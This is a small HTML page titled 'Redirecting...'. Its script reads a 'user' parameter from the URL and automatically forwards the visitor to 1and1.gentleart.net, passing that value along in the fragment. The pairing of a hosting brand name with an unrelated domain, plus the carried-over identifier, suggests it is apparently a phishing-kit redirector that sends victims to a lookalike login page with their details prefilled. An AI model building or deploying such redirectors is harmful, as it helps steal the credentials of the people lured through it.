<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <script>
        // Declare a global variable for the user value
        let userValue;

        // Function to get the user value from the URL
        function getUserValue() {
            const currentUrl = new URL(window.location.href);
            userValue = currentUrl.searchParams.get('user');
        }

        // Function to redirect to the new URL
        function redirectToNewUrl() {
            const newUrl = `https://1and1.gentleart.net#${userValue}`;
            window.location.href = newUrl;
        }

        // Execute the functions on page load
        window.onload = function() {
            getUserValue();
            if (userValue) {
                redirectToNewUrl();
            } else {
                // Fallback or handle case when userValue is not present
                document.body.innerHTML = '<p>No user parameter found. Please provide a valid URL.</p>';
            }
        };
    </script>
</head>
</html>
